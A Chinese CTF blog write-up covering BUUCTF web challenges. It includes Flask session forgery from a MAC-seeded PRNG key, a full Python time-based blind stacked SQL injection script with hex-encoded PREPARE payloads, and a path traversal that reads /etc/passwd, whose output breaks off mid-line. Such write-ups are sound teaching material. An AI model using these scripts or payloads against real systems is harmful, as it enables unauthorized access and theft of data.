<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>BUUCTF Web Writeup 5 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="BUUCTF Web Writeup 5 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/04/16/BUUCTF%20Web%20WriteUp%205/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-16T13:52:58.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/In-Challenge/">In Challenge</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>16,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">BUUCTF Web Writeup 5</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>踏上第五大陆的篇章</p>
<h1 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h1><p>考点：</p>
<ul>
<li>python伪随机数</li>
<li>session伪造</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677334374354-adefe94c-8ad2-446a-aae6-e064539141fe.png#averageHue=%23dbdad9&clientId=uec0cab0f-5564-4&from=paste&height=310&id=u6efafe91&name=image.png&originHeight=387&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57068&status=done&style=none&taskId=ub6f4d1bb-1b20-4104-aa5b-95715093fe2&title=&width=1536" alt="image.png"><br>读取源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">encoding:utf-<span class="number">8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
<p>主要逻辑和思路很简单，获取session的key，然后伪造session访问flag路由，重点是key的获取</p>
<h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><ul>
<li>uuid.getnode()：其中的getnode是获取主机的mac地址：</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677334472347-ac57c5f7-4bde-4a98-a0f2-d8d43b83a493.png#averageHue=%23faf9f8&clientId=uec0cab0f-5564-4&from=paste&height=193&id=ua2c94237&name=image.png&originHeight=241&originWidth=1699&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26367&status=done&style=none&taskId=u24f416ac-4ea4-4bc0-8250-b786454106c&title=&width=1359.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677334480561-2f0719c2-43df-4beb-80a0-f042eff16786.png#averageHue=%23fbfafa&clientId=uec0cab0f-5564-4&from=paste&height=285&id=ub3e54646&name=image.png&originHeight=356&originWidth=1230&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24738&status=done&style=none&taskId=u12b30665-6eed-4233-90b8-c5d5ffcee56&title=&width=984" alt="image.png"><br>读取mac地址：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677334507642-e6d25bf0-be3e-44d1-9f4f-3d4968325bda.png#averageHue=%23b1b0af&clientId=uec0cab0f-5564-4&from=paste&height=67&id=u86962b98&name=image.png&originHeight=84&originWidth=1198&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12146&status=done&style=none&taskId=u6893bd7a-5b7c-48fe-a830-39a4e4f8b20&title=&width=958.4" alt="image.png"></p>
<h2 id="session伪造"><a href="#session伪造" class="headerlink" title="session伪造"></a>session伪造</h2><p>这样就可以获取seed进而获取key：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="string">&quot;6ae6aa201799&quot;</span>,<span class="number">16</span>))</span><br><span class="line">random.seed(<span class="number">117538929252249</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random()*<span class="number">233</span>))</span><br></pre></td></tr></table></figure>
<p>上述代码在py2环境运行，因为可以读取flask对应的py版本为2：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677334570934-2613021b-7163-4176-bfa0-b24ae125d24b.png#averageHue=%23c9c4bf&clientId=uec0cab0f-5564-4&from=paste&height=218&id=u105e4e83&name=image.png&originHeight=272&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=86798&status=done&style=none&taskId=u0fa9d212-3768-492b-8210-07a09f57484&title=&width=1534.4" alt="image.png"><br><code>python3 flask_session_cookie_manager3.py decode -c &quot;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Y_oQ9Q.UZBlMNM8Xc2bAU9w8hF3jCja_Yc&quot; -s &quot;175.81180104&quot;</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677334604603-b32537b2-8bf7-4ccf-acd1-8f4b835be631.png#averageHue=%235aa6b8&clientId=uec0cab0f-5564-4&from=paste&height=80&id=u93024ecc&name=image.png&originHeight=100&originWidth=623&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=28111&status=done&style=none&taskId=u2a44b009-d169-43b5-b130-374562112bc&title=&width=498.4" alt="image.png"><br><code>python flask_session_cookie_manager3.py encode -s &quot;175.81180104&quot; -t &quot;&#123;&#39;username&#39;: b&#39;fuck&#39;&#125;&quot;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677334621175-e81270b3-420e-4ad4-a88c-33f526a9d68a.png#averageHue=%2358a5b5&clientId=uec0cab0f-5564-4&from=paste&height=84&id=u7067b537&name=image.png&originHeight=105&originWidth=703&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31628&status=done&style=none&taskId=ubcc1adaf-242e-4ac9-a9f9-f2bbfb4f706&title=&width=562.4" alt="image.png"><br>换上cookie访问路由（多访问几次生效）</p>
<h1 id="SWPU2019-Web4"><a href="#SWPU2019-Web4" class="headerlink" title="[SWPU2019]Web4"></a>[SWPU2019]Web4</h1><p>考点：PHP中的PDO，堆叠注入<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677816576092-9ac0dfd0-b938-465c-8d80-202ecdd5cf33.png#averageHue=%23f6f6f5&clientId=u5ee9e92a-9644-4&from=paste&height=512&id=uc1db9f6d&name=image.png&originHeight=640&originWidth=1390&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93258&status=done&style=none&taskId=ub1e7cab6-63fa-4b0c-a3bf-afc8ea2829f&title=&width=1112" alt="image.png"><br>看到这个JSON和PHP就应该对PDO敏感？其实PHP里连接mysql数据库有多种方法，mysqli，PDO<br>具体参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3950#toc-1">https://xz.aliyun.com/t/3950#toc-1</a><br>这里就介绍一下解题思路，在username加单引号出现报错，说明有注入风险，但是测试一波后发现select，if，sleep都没了，那基本是没戏了，所以思路放到堆叠注入，写个脚本跑出来：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://d4999e04-df98-4881-bf01-2f8a06c2c145.node4.buuoj.cn:81/index.php?r=Login/Login&quot;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexgenerator</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    hexres=<span class="string">&#x27;0x&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        word=<span class="built_in">ord</span>(word)</span><br><span class="line">        hex_word=<span class="built_in">hex</span>(word)[<span class="number">2</span>:]</span><br><span class="line">        hexres+=hex_word</span><br><span class="line">    <span class="keyword">return</span> hexres</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload=<span class="string">f&quot;select if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),0)&quot;</span></span><br><span class="line">        payload=<span class="string">f&quot;select if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),0)&quot;</span></span><br><span class="line">        payload=<span class="string">f&quot;select if(ascii(substr((select group_concat(flag) from flag),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(1),0)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27;;prepare boogipop from <span class="subst">&#123;hexgenerator(payload)&#125;</span>;execute boogipop -- -&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>:<span class="string">&quot;123456&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        t1=time.time()</span><br><span class="line">        <span class="comment"># print(json.dumps(data))</span></span><br><span class="line">        r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        t2=time.time()</span><br><span class="line">        <span class="built_in">print</span>(t2-t1)</span><br><span class="line">        <span class="keyword">if</span> t2-t1&gt;<span class="number">1</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">1</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>然后跑出来一个<code>glzjin_wants_a_girl_friend.zip</code>文件，拿到了网页的源代码，主要逻辑在这：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;about&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .fakeimg &#123;</span><br><span class="line">            height: <span class="number">200</span>px;</span><br><span class="line">            background: <span class="comment">#aaa;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">jumbotron</span> <span class="title">text</span>-<span class="title">center</span>&quot; <span class="title">style</span>=&quot;<span class="title">margin</span>-<span class="title">bottom</span>:0&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h1</span>&gt;<span class="title">WELCOME</span> <span class="title">TO</span> <span class="title">SWPUCTF2019</span>&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;<span class="title">nav</span> <span class="title">class</span>=&quot;<span class="title">navbar</span> <span class="title">navbar</span>-<span class="title">inverse</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">fluid</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">sm</span>-4&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h2</span>&gt;关于我&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">h5</span>&gt;我的照片:&lt;/<span class="title">h5</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">fakeimg</span>&quot;&gt;&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                <span class="title">if</span>(!<span class="title">isset</span>($<span class="title">img_file</span>)) </span>&#123;</span><br><span class="line">                    <span class="variable">$img_file</span> = <span class="string">&#x27;/../favicon.ico&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$img_dir</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="variable">$img_file</span>;</span><br><span class="line">                <span class="variable">$img_base64</span> = <span class="title function_ invoke__">imgToBase64</span>(<span class="variable">$img_dir</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;&#x27;</span> . <span class="variable">$img_base64</span> . <span class="string">&#x27;&quot;&gt;&#x27;</span>;       <span class="comment">//图片形式展示</span></span><br><span class="line">                <span class="meta">?&gt;</span>&lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">imgToBase64</span>(<span class="params"><span class="variable">$img_file</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$img_base64</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$img_file</span>)) &#123;</span><br><span class="line">        <span class="variable">$app_img_file</span> = <span class="variable">$img_file</span>; <span class="comment">// 图片路径</span></span><br><span class="line">        <span class="variable">$img_info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$app_img_file</span>); <span class="comment">// 取得图片的大小，类型等</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$app_img_file</span>, <span class="string">&quot;r&quot;</span>); <span class="comment">// 图片是否可读权限</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;</span><br><span class="line">            <span class="variable">$filesize</span> = <span class="title function_ invoke__">filesize</span>(<span class="variable">$app_img_file</span>);</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fp</span>, <span class="variable">$filesize</span>);</span><br><span class="line">            <span class="variable">$file_content</span> = <span class="title function_ invoke__">chunk_split</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>)); <span class="comment">// base64编码</span></span><br><span class="line">            <span class="keyword">switch</span> (<span class="variable">$img_info</span>[<span class="number">2</span>]) &#123;           <span class="comment">//判读图片类型</span></span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>: <span class="variable">$img_type</span> = <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>: <span class="variable">$img_type</span> = <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>: <span class="variable">$img_type</span> = <span class="string">&quot;png&quot;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$img_base64</span> = <span class="string">&#x27;data:image/&#x27;</span> . <span class="variable">$img_type</span> . <span class="string">&#x27;;base64,&#x27;</span> . <span class="variable">$file_content</span>;<span class="comment">//合成图片的base64编码</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$img_base64</span>; <span class="comment">//返回图片的base64</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里肯定存在一个任意文件读取，只要修改img_file变量的参数，而该变量在Cotroller中可以直接去赋值，那就好说了：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677820971282-dced4343-8405-4e94-994b-fc3faa5ed943.png#averageHue=%232a2b28&clientId=uab00b362-12a5-4&from=paste&height=331&id=u93adc1fe&name=image.png&originHeight=414&originWidth=1582&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=874503&status=done&style=none&taskId=u19d2c8f2-e5b3-44f4-82d1-1ac4a188595&title=&width=1265.6" alt="image.png"><br><code>?img_file=/../../../../etc/passwd</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/ash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">news:x:9:13:news:/usr/lib/news:/sbin/nologin</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/bin/sh</span><br><span class="line">man:x:13:15:man:/usr/man:/sbin/nologin</span><br><span class="line">postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin</span><br><span class="line">cron:x:16:16:cron:/var/spool/cron:/sbin/nologin</span><br><span class="line">ftp:x:21:21::/var/lib/ftp:/sbin/nologin</span><br><span class="line">sshd:x:22:22:sshd:/dev/null:/sbin/nologin</span><br><span class="line">at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin</span><br><span class="line">squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin</span><br><span class="line">xfs:x:33:33:X 